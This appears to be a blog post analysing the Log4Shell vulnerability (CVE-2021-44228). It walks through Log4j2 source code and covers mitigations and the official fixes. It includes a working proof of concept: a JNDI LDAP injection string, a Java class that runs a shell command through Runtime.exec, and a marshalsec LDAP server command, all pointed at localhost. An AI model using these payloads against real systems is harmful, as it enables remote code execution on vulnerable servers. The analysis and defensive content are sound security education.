<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Vulnerability Analysis - CVE-2021-44228 Log4Shell - 4xpl0r3r&#039;s blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="4xpl0r3r&#039;s blog"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="4xpl0r3r&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Using Java 8u181"><meta property="og:type" content="blog"><meta property="og:title" content="Vulnerability Analysis - CVE-2021-44228 Log4Shell"><meta property="og:url" content="https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/"><meta property="og:site_name" content="4xpl0r3r&#039;s blog"><meta property="og:description" content="Using Java 8u181"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155612476.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155630289.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160349045.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160832271.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161231396.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161657043.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161941649.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165049793.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165155009.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165215145.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191652712.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191657495.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119192017647.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203640824.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203737325.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203859702.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204000127.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204003833.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204438853.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204722750.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204943826.png"><meta property="og:image" content="https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119205538805.png"><meta property="article:published_time" content="2022-01-19T13:06:00.000Z"><meta property="article:modified_time" content="2022-02-11T11:45:45.085Z"><meta property="article:author" content="4xpl0r3r"><meta property="article:tag" content="CVE"><meta property="article:tag" content="Java"><meta property="article:tag" content="JNDI"><meta property="article:tag" content="Format String"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155612476.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/"},"headline":"Vulnerability Analysis - CVE-2021-44228 Log4Shell","image":["https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155612476.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155630289.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160349045.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160832271.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161231396.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161657043.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161941649.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165049793.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165155009.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165215145.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191652712.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191657495.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119192017647.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203640824.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203737325.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203859702.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204000127.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204003833.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204438853.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204722750.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204943826.png","https://www.4xpl0r3r.com/img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119205538805.png"],"datePublished":"2022-01-19T13:06:00.000Z","dateModified":"2022-02-11T11:45:45.085Z","author":{"@type":"Person","name":"4xpl0r3r"},"publisher":{"@type":"Organization","name":"4xpl0r3r's blog","logo":{"@type":"ImageObject","url":{"text":"4xpl0r3r"}}},"description":"Using Java 8u181"}</script><link rel="canonical" href="https://www.4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?3fec34a29e38d2bb96785908e568c11f";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-997MZZV1T0" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-997MZZV1T0');</script><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="follow_it-verification-code" content="7RZ9jE39c8SCaWnWQPl8"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="4xpl0r3r's blog" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">4xpl0r3r</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/4xpl0r3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-19T13:06:00.000Z" title="1/19/2022, 9:06:00 PM">2022-01-19</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-02-11T11:45:45.085Z" title="2/11/2022, 7:45:45 PM">2022-02-11</time></span><span class="level-item"><a class="link-muted" href="/categories/Vuln-Analysis/">Vuln-Analysis</a></span><span class="level-item">14 minutes read (About 2132 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Vulnerability Analysis - CVE-2021-44228 Log4Shell</h1><div class="content"><p>Using Java 8u181</p>
<span id="more"></span>

<article class="message message-immersive is-primary">
<div class="message-body">
<i class="fas fa-globe-asia mr-2"></i>This article is also available in 
<a target="_blank" rel="noopener" href="https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/">简体中文</a>.
</div>
</article>


<h2 id="Vulnerability-Profile"><a href="#Vulnerability-Profile" class="headerlink" title="Vulnerability Profile"></a>Vulnerability Profile</h2><p>Apache Log4j2 is a logging tool. Because Apache Log4j2 offers some functions that could parse recursively, an attacker can directly construct a malicious request to trigger the remote code execution.The vulnerability works with default configuration.</p>
<p>Verified by the Ali Cloud security team, It is affected for Apache Struts2, Apache Solr, Apache Druid, Apache Flink, etc.</p>
<p>All systems running Apache log4j2 2.0-beta9 through 2.14.1 are vulnerable. If the Java application imports the <code>log4j-core</code>, it is most likely to be affected.</p>
<h2 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h2><h3 id="The-Exploit-Code"><a href="#The-Exploit-Code" class="headerlink" title="The Exploit Code"></a>The Exploit Code</h3><p>Use the maven to build a project to trigger the vulnerability and import the <code>org.apache.logging.log4j</code> module which version is <code>2.14.1</code> .</p>
<p>If the logger uses a recordable level to log the payload , the vulnerability will be triggered.</p>
<p>The trigger code is as shown below.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://ip:1389/#Exploit&#125;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Use the code shown below to build a class file used by JNDI</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">&quot;curl 127.0.0.1:5555&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Compile the code to get the <code>.class</code> file. The construction method will be run by JNDI.</p>
<h3 id="Trigger-the-vulnerability"><a href="#Trigger-the-vulnerability" class="headerlink" title="Trigger the vulnerability"></a>Trigger the vulnerability</h3><p>It’s typical JNDI Injection progress. Firstly, move the <code>.class</code> file to a web server, and then, make use of <code>marshalsec</code> to set up JNDI and LDAP service, the command is as shown below</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure>

<h2 id="Analysis-of-the-Vulnerabilty"><a href="#Analysis-of-the-Vulnerabilty" class="headerlink" title="Analysis of the Vulnerabilty"></a>Analysis of the Vulnerabilty</h2><h3 id="Analysis-of-the-source-code"><a href="#Analysis-of-the-source-code" class="headerlink" title="Analysis of the source code"></a>Analysis of the source code</h3><p>As we all know, the exploit is working with JNDI, so we make a breakpoint in the constrution method of <code>javax.naming.InitialContext</code> . The source code is located in <code>rt.jar/javax/naming/InitialContext.java</code></p>
<p>After running the trigger code, the execution will be paused at the breakpoint.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155612476.png" alt="image-20220119155612476"></p>
<p>The calling stack is as shown below</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119155630289.png" alt="image-20220119155630289"></p>
<p>It’s obviously that if we want to exploit with JNDI, there must be a calling for <code>lookup</code> method, so let’s trace reversely form <code>JndiLookup.look()</code>.</p>
<p>To determine where is the code that focus to the payload <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code>, we can add some junk into the logging message. Running the trigger again, we can find that the <code>substitute</code> methond deferenced <code>AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBB</code> into <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code>.</p>
<p>Apart from this, we can find there is a method called <code>resolveVariable</code> which is using to parse variable wrapper with  <code>$&#123;&#125;</code>.</p>
<p> Keep tracing, we can find a piece of code as below</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160349045.png" alt="image-20220119160349045"></p>
<p>We can find that if it meet the variable starting with <code>$&#123;</code>, the code will replace it with the resolved variable.</p>
<h3 id="Going-deeper"><a href="#Going-deeper" class="headerlink" title="Going deeper"></a>Going deeper</h3><p>Log4j2 has 3 major components.</p>
<ul>
<li>Logger - log the message</li>
<li>Appender - output the message</li>
<li>Layout - format the message</li>
</ul>
<p>Keep tracing the calling stack, we can find that log4j2 use <code>LoggerConfig.processLogEvent()</code> to resolve logging event, use <code>callAppenders()</code> to call Appender to ouput the message.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119160832271.png" alt="image-20220119160832271"></p>
<p>The function of Appender is transfer the logging event to the target. There are some commonly used Appender such as ConsoleAppender(output to the console), FileAppender(output to a file). It will use AppenderControl to gain the specific Appender. In this debug session, it is ConsoleAppender.</p>
<p>The Appender uses  the Layout to get the logging format, formats the logging message with <code>Layout.encode()</code>.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161231396.png" alt="image-20220119161231396"></p>
<p>The Layout will use formatters to finish the formating.</p>
<p>The inputted message is resolved by <code>MessagePatternConverter.format()</code>, it’s a important part of the vulnerabilty.</p>
<p>When the config is exist and the <code>noLookups</code> is false, if there is a <code>$&#123;&#39;</code> in the message, it will call <code>workingBuilder.append()</code> to get the <code>StrSubstitutor</code> to replace the variable with resolved one</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161657043.png" alt="image-20220119161657043"></p>
<p>We can find there is a <code>noLookups</code> which is a value of configuration, the default value of it is the false. We will make use of it to temporarily fix the vulnerabilty later.</p>
<p>Going forward, we can find the <code>StrSubstitutor.resolveVariable()</code> , it is used to resolve and parse, suporting the protocols incluing JNDI as below</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119161941649.png" alt="image-20220119161941649"></p>
<h3 id="Mitigation-Disable-Lookups-with-System-configuration"><a href="#Mitigation-Disable-Lookups-with-System-configuration" class="headerlink" title="Mitigation - Disable Lookups with System configuration"></a>Mitigation - Disable Lookups with System configuration</h3><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165049793.png" alt="image-20220119165049793"></p>
<p>We can check the cross reference to determine where the <code>noLookups</code> was assigned, it is as below</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165155009.png" alt="image-20220119165155009"></p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119165215145.png" alt="image-20220119165215145"></p>
<p>As a example, I add a line of code to change the system configration, it could also be set by command line or <code>.properties</code> configration file.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">        logger.error(<span class="string">&quot;AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBBB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> Run the trigger code again, we can find that <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code> won’t be parsed</p>
<h3 id="Mitigation-Disable-Lookups-with-Log4j-Configuration"><a href="#Mitigation-Disable-Lookups-with-Log4j-Configuration" class="headerlink" title="Mitigation - Disable Lookups with Log4j Configuration"></a>Mitigation - Disable Lookups with Log4j Configuration</h3><blockquote>
<p>In my opinion, it’s the best way to protect the system without upgrading</p>
<p>The official documet: <a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></p>
</blockquote>
<p>The MVP(Minimum Viable Product) of configuration in XML is as shown below.</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;nolookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Apart from XML, the Log4j also support other formats such as json.</p>
<h3 id="Thinking-Why-the-Log4j2-needs-the-capability-of-JNDI"><a href="#Thinking-Why-the-Log4j2-needs-the-capability-of-JNDI" class="headerlink" title="Thinking - Why the Log4j2 needs the capability of JNDI"></a>Thinking - Why the Log4j2 needs the capability of JNDI</h3><p>After checking the official documents <a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/log4j-2.3/manual/configuration.html#PropertySubstitution">Log4j – Configuring Log4j 2 - Apache Log4j 2</a>,I found the Property Substitution function, it offers the capability to retrieve attributes remotely to make the logging information more abundant</p>
<p>Because the developers didn’t aware the potential harm, the default value of noLookups was set to false and the source of JNDI wasn’t been restricted.</p>
<h2 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h2><h3 id="The-common-false-positive"><a href="#The-common-false-positive" class="headerlink" title="The common false positive"></a>The common false positive</h3><p>Many tester determine if the system is vulnerable to the CVE-2021-44228 by checking the DNS request, it’s not rigorous. Many Public Service could send the DNS request for the domian in the payload to take spam intercepting or any else, so the DNS request can’t be the evidence of vulnerabilty.</p>
<p>There is a better method to check, just insert the <code>$&#123;sys:java.version&#125;</code> into the subdomain, it will be much more accurate.</p>
<h3 id="How-to-defense"><a href="#How-to-defense" class="headerlink" title="How to defense"></a>How to defense</h3><ol>
<li>Upgrade the log4j2</li>
<li>Disable Lookups with System configuration</li>
<li>Disable Lookups with Log4j Configuration</li>
</ol>
<h3 id="The-official-fixing"><a href="#The-official-fixing" class="headerlink" title="The official fixing"></a>The official fixing</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></p>
</blockquote>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191652712.png" alt="image-20220119191652712"></p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119191657495.png" alt="image-20220119191657495"></p>
<p>As shown above, in Release 2.15.0, it disabled the lookups by default and limit the servers and classes that can be accessed via LDAP.</p>
<p>What’s more, In release 2.16.0, disable JNDI by default. Require log4j2.enableJndi to be set to true to allow JNDI and completely remove support for Message Lookups.</p>
<p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119192017647.png" alt="image-20220119192017647"></p>
<h2 id="The-Bypassing-in-log4j-2-15-0-RC1"><a href="#The-Bypassing-in-log4j-2-15-0-RC1" class="headerlink" title="The Bypassing in log4j 2.15.0-RC1"></a>The Bypassing in log4j 2.15.0-RC1</h2><h3 id="Compiling"><a href="#Compiling" class="headerlink" title="Compiling"></a>Compiling</h3><p>Because the 2.15.0-RC1 don’t exist in the maven repository, we have to get the source code from GitHub and compile it manually.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/tags">Tags · apache/logging-log4j2 (github.com)</a></p>
<p>According to the <code>README.md</code>, configure the jdk in the toolschains files and we only need the packages for jdk1.8, so just comment out the others.</p>
<p>Because we don’t need all the modules, modify the <code>modules</code> in <code>pom.xml</code> as shown below</p>
